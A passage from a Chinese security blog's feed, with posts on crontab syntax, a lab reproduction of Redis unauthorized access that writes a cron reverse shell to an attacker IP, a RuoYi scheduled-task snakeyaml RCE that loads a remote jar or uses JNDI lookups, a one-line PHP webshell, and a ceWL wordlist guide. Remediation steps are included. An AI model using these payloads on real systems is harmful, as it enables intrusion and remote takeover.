alt="Crontab格式说明"></p><p>对于前5个时间字段，可以使用以下特殊字符：</p><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>代表所有的取值范围内的数字，如月份字段为*，则表示1到12个月；</td></tr><tr><td>/</td><td>代表每一定时间间隔的意思，如分钟字段为*/10，表示每10分钟执行1次。</td></tr><tr><td>-</td><td>代表从某个区间范围，是闭区间。如“2-5”表示“2,3,4,5”，小时字段中0-23/2表示在0~23点范围内每2个小时执行一次。</td></tr><tr><td>,</td><td>分散的数字（不一定连续），如1,2,3,4,7,9。</td></tr></tbody></table><blockquote><p>注：由于各个地方每周第一天不一样，因此Sunday=0（第一天）或Sunday=7（最后1天）。</p></blockquote><p>例如： <code>* * * * * /bin/echo "123" &gt;&gt; /home/john/Desktop/1.txt</code></p><p>含义是每隔一分钟，执行一个动作：将字符串”123”追加到桌面上的1.txt文件中。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>这里我就把菜鸟教程上的实例粘贴过来了，附上地址：</p><p><a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">Linux Crontab 定时任务 | 菜鸟教程</a></p><p><strong>实例1：每1分钟执行一次myCommand</strong></p><p><code>\* * * * * myCommand</code></p><p><strong>实例2：每小时的第3和第15分钟执行</strong></p><p><code>3,15 * * * * myCommand</code></p><p><strong>实例3：在上午8点到11点的第3和第15分钟执行</strong></p><p><code>3,15 8-11 * * * myCommand</code></p><p><strong>实例4：每隔两天的上午8点到11点的第3和第15分钟执行</strong></p><p><code>3,15 8-11 */2  *  * myCommand</code></p><p><strong>实例5：每周一上午8点到11点的第3和第15分钟执行</strong></p><p><code>3,15 8-11 * * 1 myCommand</code></p><p><strong>实例6：每晚的21:30重启smb</strong></p><p><code>30 21 * * * /etc/init.d/smb restart</code></p><p><strong>实例7：每月1、10、22日的4 : 45重启smb</strong></p><p><code>45 4 1,10,22 * * /etc/init.d/smb restart</code></p><p><strong>实例8：每周六、周日的1 : 10重启smb</strong></p><p><code>10 1 * * 6,0 /etc/init.d/smb restart</code></p><p><strong>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb</strong></p><p><code>0,30 18-23 * * * /etc/init.d/smb restart</code></p><p><strong>实例10：每星期六的晚上11 : 00 pm重启smb</strong></p><p><code>0 23 * * 6 /etc/init.d/smb restart</code></p><p><strong>实例11：每一小时重启smb</strong></p><p><code>0 */1 * * * /etc/init.d/smb restart</code></p><p><strong>实例12：晚上11点到早上7点之间，每隔一小时重启smb</strong></p><p><code>0 23-7/1 * * * /etc/init.d/smb restart</code></p><h3 id="cron表达式"><a href="#cron表达式" class="headerlink" title="cron表达式"></a>cron表达式</h3><p>   比较奇怪的是，linux的cron标准在时间上只有5个域，所以最小只支持到分钟量级的间隔时间，而不支持秒量级的间隔时间，所以又有人提出了cron表达式。</p><p>   cron表达式基本构成为 7个时间字段，即 秒+分+时+天+月+星期+年， 每一段可用的特殊字符除了前面所提到的四个字符外，cron表达式还规定了如下几个特殊字符：</p><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>?</td><td>任何值， 表示不关心具体哪一天，只能用于天（day_of_month）和星期（day_of_week）两个字段</td></tr><tr><td>L</td><td>last，表示某个月最后一天或某个星期的最后一天</td></tr><tr><td>W</td><td>工作日（周一至周五）</td></tr><tr><td>#</td><td>表示某个月的第几个星期几，如4#2表示某月的第二个星期四</td></tr></tbody></table><p>每个字段的取值范围如下：</p><ul><li><p>秒（second）：0~59</p></li><li><p>分钟（minute）：0~59</p></li><li><p>小时（hour）：0~23</p></li><li><p>日（day）：1~31</p></li><li><p>月（month）：1~12或JAN-DEC</p></li><li><p>年（year）：可选，1970~2099或者空</p></li></ul><p>比如上一遍笔记我用到的cron表达式：</p><p><code>0/10 * * * * ? </code></p><p>代表每10秒执行一次任务。</p><p>具体示例可以看阿里云的这篇文章：</p><p><a href="https://help.aliyun.com/document_detail/133509.html">简单任务CRON表达式的详解_金融分布式架构 SOFAStack(SOFAStack)-阿里云帮助中心</a></p><h2 id="0x03-redis未授权漏洞复现（写入计划任务反弹shell）"><a href="#0x03-redis未授权漏洞复现（写入计划任务反弹shell）" class="headerlink" title="0x03 redis未授权漏洞复现（写入计划任务反弹shell）"></a>0x03 redis未授权漏洞复现（写入计划任务反弹shell）</h2><p>顺便再次复习一下redis未授权访问的漏洞吧。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ubuntu（192.168.1.133）：redis服务器   模拟靶机</p><p>kali（192.168.1.129）：redis客户端  模拟攻击者</p><p>centos(192.168.1.134) :redis服务器 模拟靶机   （后面加的）</p><p>我的kali中是有redis客户端的，就是在ubuntu上需要安装redis服务，这里就直接从官方网站上下载压缩包，然后解压编译，具体命令如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz </span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">cd src</span><br><span class="line">sudo su root  # 必须以root身份编译</span><br><span class="line">make install</span><br><span class="line">make test</span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cd ../</span><br><span class="line">cp redis.conf /etc/redis.conf</span><br></pre></td></tr></tbody></table></figure><p>然后启动redis-server</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702785458048-0f5c5a08-e518-43dc-a146-bf2eb87c57cc.png" alt="ubuntu开启redis-server"></p><h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>主要是因为配置不当，将Redis服务绑定到公共接口，甚至没有密码身份验证。</p><p>在ubuntu中查看redis配置文件/etc/redis.conf，如果bind 127.0.0.1 那行被注释了，当前redis就是被绑定在了0.0.0.0:6379，如果也没有设置requirepass的配置字段，防火墙也没有限定可以连接的源ip，那么就很可能存在redis未授权访问，</p><p>kali端通过redis-cli即可直接连接到redis服务器上。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702785943797-c1c4a239-9763-4b07-baa5-4813a1a0e0d8.png" alt="kali通过redis-cli直接连接到redis服务器"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>redis未授权访问一共三种利用方式：</p><ol><li><p>确定webshell路径后，写入webshell</p></li><li><p>写入ssh-keygen公钥，进行ssh登录</p></li><li><p>写入计划任务反弹shell</p></li></ol><p>由于这篇主题是计划任务，所以这里只复现计划任务反弹shell了。</p><p>在kali连接到redis服务器后，先建立计划任务：</p><p><code>set x "\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.1.129/6666 0&lt;&amp;1 2&gt;&amp;1\n"</code></p><p>然后将计划任务放到定时任务下：</p><p><code>config set dir /var/spool/cron/</code></p><p>接着设置以root用户的身份执行该任务</p><p><code>config set dbfilename root</code></p><p>最后输入 <code>save</code>命令保存</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702786057207-e425186b-eb69-40be-bf94-2099e00f7a86.png" alt="写入计划任务"></p><p>显示<code>ok</code>表示计划任务写入成功。</p><p>注意：服务端的redis-server需要在root权限下运行，否则在攻击机上最后<code>save</code>时会报错，显示<code>(error) ERR</code></p><p>查看写入的计划任务的文件<code>/var/spool/cron/root</code></p><p>发现是写入成功了，但是出现乱码。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702786013177-279c28ac-77ab-44a3-aae8-c68e3610cbcc.png" alt="查看写入的计划任务"></p><p> 先直接测试一下看看能不能反弹。</p><p>因为刚才设置计划任务是将shell反弹到kali的6666端口上，所以我们用nc来监听6666端口，看是否能成功反弹</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  -lvvp 6666</span><br></pre></td></tr></tbody></table></figure><p>等了半天，没能成功反弹。 看了其他人的文章后才发现，ubuntu环境下写入计划任务的方式是不能反弹shell的，就是由于这个乱码，而centos环境下是可以的，因为centos可以忽略乱码继续往下执行。</p><h4 id="换成centos环境继续测试"><a href="#换成centos环境继续测试" class="headerlink" title="换成centos环境继续测试"></a>换成centos环境继续测试</h4><p>下面就把靶机换成centos7（192.168.1.134），重复上面的安装操作，在centos上开启redis服务器，再次尝试上述同样的操作。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702782868667-8e42b3d9-bbd2-44df-b821-3c8bea657324.png" alt="kali连接服务器并写入计划任务"></p><p>然后在centos中查看是否成功写入计划任务：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702783121822-bbc3e278-2372-4d63-8f43-6a2ed634b738.png" alt="查看写入的计划任务"></p><p>上面一行是我之前测试的没有成功，下面一行是我现在成功写入的。</p><p>kali上 <code>nc -lvvp 6666</code> 监听6666端口：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702783281278-8e882a8a-8126-4ccb-8b6b-2336ea3e3735.png" alt="成功反弹shell"></p><p>可以看到成功反弹权限为root的shell！至此复现成功。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol><li><p>禁止Redis服务对公网开放,可通过修改redis.conf配置文件中的bind那行配置 </p></li><li><p>设置密码访问认证,可通过修改redis.conf配置文件中的”requirepass”，增加身份验证</p></li><li><p>对访问源IP进行访问控制,可在防火墙限定指定源ip才可以连接Redis服务器;</p></li><li><p>修改Redis默认端口,将默认的6379端口修改为其他端口。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计划任务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>若依 cms 后台写入计划任务 RCE</title>
      <link href="/2023/12/14/%E8%8B%A5%E4%BE%9D-cms-%E5%90%8E%E5%8F%B0%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-RCE/"/>
      <url>/2023/12/14/%E8%8B%A5%E4%BE%9D-cms-%E5%90%8E%E5%8F%B0%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次失败的 getshell。</p><p>本来一处资产通过弱口令 admin、admin123进入后台，但是没能发现后台是什么 cms 或者框架写的，尝试了一些上传点没成功后就继续测其他资产了，好在有高人指点，发现后台有一处可以写入定时任务，上网搜了相关文章，才发现这个后台是若依 cms ，有历史漏洞就是通过这处定时任务能够 rce。遗憾的是这个后台是个高版本的若依搭建的，最终没能成功利用，不过顺便写了这篇笔记。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>RuoYi &lt;= v4.6.2</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>若依的项目下载地址在这里：</p><p><a href="https://github.com/yangzongzhuan/RuoYi/releases">https://github.com/yangzongzhuan/RuoYi/releases</a></p><p>这里我在本地搭建的环境为版本v4.6.1的，在影响版本范围内。</p><p>需要下载redis服务，在本地6379开启redis服务。具体搭建细节可以参考这个博客：<a href="https://blog.csdn.net/qq_41607217/article/details/118904019">RuoYi(若依开源框架)-前后台分离版-idea搭建运行</a></p><p>搭建完成后，运行项目，即可通过浏览器访问对应端口，得到如下后台登录页面：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702430541928-e54d8b72-f80a-4132-9d38-0cba3d692824.png" alt="若依后台登录界面"></p><p>默认用户名和密码输入admin:admin123,即可登录后台</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702430655019-172909c0-0c46-4063-ba0a-a8daee3e5213.png" alt="进入后台"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞产生处是系统监控模块中的定时任务，在其中调用目标字符串中填入恶意的payload，即可利用计划任务进行rce</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702430697066-a8c45b6e-12df-46e1-99d3-cd602289ceb0.png" alt="漏洞点"></p><p>关于payload，有大佬已经在github上写好了，地址如下：<a href="https://github.com/artsploit/yaml-payload">artsploit/yaml-payload</a></p><p>下载下来后，需要将  AwesomeScriptEngineFactory.java 文件中的命令执行语句改成自己要执行的命令，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702477603911-cf8635b1-f775-4be6-8923-c8094fbaa5bd.png" alt="修改payload"></p><p>注：这里我利用的 dnslog进行验证，使用的是<a href="http://ceye.io/">CEYE - Monitor service for security testing</a>这个 dnslog平台。</p><p>然后在src所在目录下打开cmd运行如下语句，将该项目编译成jar</p><p>最后得到yaml-payload.jar文件，将其丢到自己的vps上，然后在vps上开启http服务，这里我利用python开启个简易的文件下载http服务</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702431475550-6c8aa773-7f9f-40a1-940a-a4c68604300a.png" alt="在自己的服务器上开启简易的http服务"></p><p>然后在刚刚登陆的若依cms后台，添加定时任务，这里构造的调用目标字符串如下：</p><p>其中cron表达式 <code>0/10 * * * * ?</code> 意思是每10秒执行一次调用目标字符串的任务，这里就不详细说明了,留到下一篇笔记记录学习。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702432332419-07db0a0c-561d-41ee-a5bf-8f52bddedd42.png" alt="写入计划任务"></p><p>这里我写入后，点击任务状态下的那个按钮，启动定时任务，但是发现最后一直没执行成功，点开上面日志后才发现运行失败了（下图），后来猜测是我搭建平台的问题，想到windows平台不存在类似cron表达式的计划任务形式，索性我就直接改成macos平台测试了，和linux差不多的计划任务方式。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1.png" alt="执行失败"></p><p>换成 mac后（mac 系统和 linux 系统相近，也有计划任务），搭建相同的环境，再次利用，终于看到回显结果（我 mac 电脑主机名是 jackielee）：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702478318713-de879e25-53f0-47be-bd24-62beb169f5d7.png" alt="成功得到回显结果"></p><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>若依后台管理系统使用了snakeyaml 的jar包，snakeyaml是用来解析yaml的格式，可用于Java对象的序列化、反序列化。而若依后台管理系统可以通过定时任务功能构造payload远程调用jar包，从而导致 RCE。</p><p>当然还可以尝试下面两种打法：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')</span><br><span class="line"></span><br><span class="line">javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit')</span><br></pre></td></tr></tbody></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>首先是修复yaml 反序列化问题，加入<code>new SafeConstructor()</code>类进行过滤</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">"!!javax.script.ScriptEngineManager [\n"</span> +</span><br><span class="line"></span><br><span class="line">                <span class="string">"  !!java.net.URLClassLoader [[\n"</span> +</span><br><span class="line"></span><br><span class="line">                <span class="string">"    !!java.net.URL [\"http://ip:1234/yaml-payload.jar\"]\n"</span> +</span><br><span class="line"></span><br><span class="line">                <span class="string">"  ]]\n"</span> +</span><br><span class="line">                <span class="string">"]"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());            <span class="comment">//加入new SafeConstructor()类进行过滤</span></span><br><span class="line"></span><br><span class="line">        yaml.load(context);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>再次进行反序列化会抛异常。 </p><p>再者就是拒绝不安全的反序列化操作，反序列化数据前需要经过校验或拒绝反序列化数据可控。</p><p>高版本的若依 cms还屏蔽了 http、rmi、ldap 这些协议，也难怪我没能成功 getshell那个若依后台。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 若依cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php最短一句话</title>
      <link href="/2023/04/11/php%E6%9C%80%E7%9F%AD%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
      <url>/2023/04/11/php%E6%9C%80%E7%9F%AD%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<p>php最短一句话如下:</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></tbody></table></figure><p>作用相当于执行系统命令:</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20230411225445368.png" alt="测试一句话打开计算器"></p><p>可以看到，成功执行了<code>calc</code>这系统命令，打开了系统计算器。</p><p>看到一个知识星球上说下面这两个超短一句话也可以：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20230411225947619.png" alt="另外两个一句话"></p><p>我用的php5.5.9的版本试了一下没能成功，不知道是不是这个版本问题，有兴趣的小伙伴也可以自己试试。</p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一句话 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的博客搭建</title>
      <link href="/2023/04/05/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/04/05/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="这是这个站点的第一篇文章"><a href="#这是这个站点的第一篇文章" class="headerlink" title="这是这个站点的第一篇文章"></a>这是这个站点的第一篇文章</h1><p>​其实也算不上啥网站吧，这个站点只是我利用的<code>Github page</code>服务搭建的一个博客站，使用的博客框架是<code>hexo</code>，主题采用的其中的<code>hexo-theme-matery</code>。看很多博客作者都宣传hexo这个框架，说用它搭建网站很简洁、快速和高效，我想说的是：“千万别信”，一些配置啥的十分麻烦，非常蛋疼，主要是因为hexo基于的是nodejs，没有后台可以进行编辑，全程都是在命令行和整个配置文件中对整个博客进行编辑、发布和测试，导致搭建的过程很繁琐。不过也可能是因为我的水平有限,连照着配置都不会吧<span class="github-emoji"><span>😭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p>​主要还是不愿意自己花钱去买一些vps来搭建，一是更麻烦，二是贵。我也考虑过国外的一些服务器提供商，比如<code>Racknerd</code>、<code>vultr</code>之流，虽然是便宜，但是安全性、稳定性上又不是靠谱。等我以后赚米了要狠狠的买个配置好的高档服务器<span class="github-emoji"><span>😆</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 。现在先将就着，利用免费的Github page服务了解了解基本的博客搭建方法。</p><p>​接下来如果有时间会陆续发一些技术文章或是日常小记分享给大家(如果有人看的话)，当然也得我有空，hh<span class="github-emoji"><span>😆</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>。<br>​最后，我希望这个博客能帮到大家，也希望大家能给我一些建议，我会尽量去完善和改进这个博客。<span class="github-emoji"><span>😄</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p>   现在是2025年4月2日的晚上11点，我对该博客网站主题进行了修改，主题由原来的<code>hexo-theme-matery</code>改为<code>cactus</code>主题， 其他一切不变， 哈哈哈哈:laughing。</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一个有关utools工具的小坑</title>
      <link href="/2022/10/30/%E6%9C%89%E5%85%B3utools%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B0%8F%E5%9D%91/"/>
      <url>/2022/10/30/%E6%9C%89%E5%85%B3utools%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B0%8F%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>utools是大多数人都会使用的工具，它可以大大提高我们的生产效率。可是今天在安装工具，并配置环境变量的时候不小心被它给坑了。。。</p><p>我配置环境变量的时候，非常依赖于utools，在它那边输入<code>hj</code>后，就可以立刻帮我调出环境变量配置界面。配置完成后，当我再次快捷键调出utool并且通过它调出cmd验证自己刚才的工具安装是否成功时，给我的回应如下：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20230428172644181.png" alt="image-20230428172644181"></p><p>我以为是自己配置错误，导致命令没能加载出来，进行多次尝试，依旧未果。</p><p>当我在想问题到底出在哪里时，我随手通过<code>win</code>+<code>R</code>快捷键调出新的cmd，再次运行该工具，发现成功！</p><p>难不成真的是utools的问题？</p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICS Windows v2.0</title>
      <link href="/2022/09/10/ICS-windows/"/>
      <url>/2022/09/10/ICS-windows/</url>
      
        <content type="html"><![CDATA[<h2 id="ICS-Windows-v2-0介绍"><a href="#ICS-Windows-v2-0介绍" class="headerlink" title="ICS Windows v2.0介绍"></a>ICS Windows v2.0介绍</h2><p>ICS Windows v2.0是IRTeam基于windows系统打造的kali工具集。也就是说使用该系统就相当于在windows上使用kali。</p><p>项目地址如下：</p><p><a href="https://github.com/jiansiting/ICS-windows#ics-windows-v20">https://github.com/jiansiting/ICS-windows#ics-windows-v20</a></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://pan.baidu.com/s/1znkAD4i3v0qyw3zytAYPQA">https://pan.baidu.com/s/1znkAD4i3v0qyw3zytAYPQA</a> </p><p>提取码：6diu </p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ceWL工具介绍</title>
      <link href="/2022/07/10/cewl%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/07/10/cewl%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这几天在做DC靶场实战的时候，注意到这样一个工具—–cewl，因为很少碰到，想更深层次了解这个工具的原理和具体使用方法。</p><h2 id="0x02-ceWL工具的介绍"><a href="#0x02-ceWL工具的介绍" class="headerlink" title="0x02 ceWL工具的介绍"></a>0x02 ceWL工具的介绍</h2><p>简单的说，ceWL（发音：cool）是一个<strong>自定义单词列表生成器</strong>，它是一个用ruby编写的应用程序，它会抓取指定的URL，知道指定的深度，并且返回单词列表，然后可以将返回的单词列表放入一些爆破工具中进行密码破解，比如约翰开膛手(John the Ripper)。</p><p>ceWL还可以创建在mailto链接中找到的电子邮件地址列表。这些电子邮件地址可以作为用户名暴力破解使用。</p><p>详情可见如下链接：<a href="https://www.kali.org/tools/cewl/">https://www.kali.org/tools/cewl/</a></p><h2 id="0x03-ceWL使用方法"><a href="#0x03-ceWL使用方法" class="headerlink" title="0x03 ceWL使用方法"></a>0x03 ceWL使用方法</h2><p>ceWL需要在命令行中执行，语法格式：<code>cewl &lt;url&gt; [options]</code></p><p><code>&lt;url&gt;</code>是指定爬取的站点，<code>options</code>是参数选项</p><p>输入<code>cewl -h </code>会显示所有命令参数还有对应的描述</p><p><strong>常规参数选项</strong></p><table><thead><tr><th>参数选项</th><th>参数意义</th></tr></thead><tbody><tr><td><code>-h,--help </code></td><td>显示帮助</td></tr><tr><td><code>-k,--keep</code></td><td>保存下载文件</td></tr><tr><td><code>-d &lt;x&gt;,--depth &lt;x&gt;</code></td><td>爬行深度，默认为2</td></tr><tr><td><code>-m,--min_world_length</code></td><td>最小长度，默认最小长度为3</td></tr><tr><td><code>-o,--offsite</code></td><td>允许爬虫访问其他站点</td></tr><tr><td><code>-w,--write</code></td><td>将输出的结果写入到文件</td></tr><tr><td><code>-u,--ua &lt;agent&gt;</code></td><td>设置user agent</td></tr><tr><td><code>-n,--no-words</code></td><td>不输出字典</td></tr><tr><td><code>--with-numbers</code></td><td>允许单词中存在数字，跟字母一样</td></tr><tr><td><code>-a,--meta</code></td><td>包括元数据</td></tr><tr><td><code>-e,--email</code></td><td>包含邮箱地址</td></tr><tr><td><code>--email_file &lt;filename&gt;</code></td><td>输入邮件地址文件</td></tr><tr><td><code>--meta-temp-dir &lt;dir&gt;</code></td><td>exiftool解析文件时使用的临时目录，默认为/tmp</td></tr><tr><td><code>-c,--count</code></td><td>显示找到的每个单词的计数。</td></tr><tr><td><code>-v,--verbose</code></td><td>详细信息</td></tr><tr><td><code>--debug</code></td><td>额外的调试信息。</td></tr></tbody></table><p><strong>认证：</strong></p><table><thead><tr><th>参数选项</th><th>参数意义</th></tr></thead><tbody><tr><td><code>--auth_type</code></td><td>Digest认证或basic认证</td></tr><tr><td><code>--auth_user</code></td><td>认证用户名</td></tr><tr><td><code>--auth_pass</code></td><td>认证密码</td></tr></tbody></table><p> <strong>代理支持：</strong></p><table><thead><tr><th>参数选项</th><th>参数意义</th></tr></thead><tbody><tr><td><code>--proxy_host</code></td><td>代理主机</td></tr><tr><td><code>--proxy_port</code></td><td>代理端口，默认8080</td></tr><tr><td><code>--proxy_username</code></td><td>代理用户名(如果需要)</td></tr><tr><td><code>--proxy_username</code></td><td>代理密码(如果需要)</td></tr></tbody></table><p> <strong>头信息：</strong></p><table><thead><tr><th>参数选项</th><th>参数意义</th></tr></thead><tbody><tr><td><code>--header,-H</code></td><td>指定请求头信息，格式为 <code>name:value</code></td></tr></tbody></table><p>比如今天我遇到的dc-2的靶场：</p><p>根据指定的url生成对应的单词列表，并写入到password文件中</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w password</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220411205903859.png" alt="命令行运行"></p><p>啪的一下，很快啊，就有了如下内容：</p><p>仔细对照了一下网站，都是上面出现的一些单词。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220411210010237.png" alt="结果"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>感觉ceWL比较适合应用于国外的网站，因为它是会爬取具体的单词，而对于国内的网站，使用后爬取到的是一大堆汉字，而这些通常不会被用来当做密码。</p><p>kali上自带cewl</p><p>附上下载地址：<a href="https://github.com/digininja/CeWL/releases">https://github.com/digininja/CeWL/releases</a></p><p>参考链接：</p><p><a href="https://www.kali.org/tools/cewl/">https://www.kali.org/tools/cewl/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tkinter的Button控件</title>
      <link href="/2022/06/04/tkinter%E7%9A%84Button%E6%8E%A7%E4%BB%B6/"/>
      <url>/2022/06/04/tkinter%E7%9A%84Button%E6%8E%A7%E4%BB%B6/</url>
      
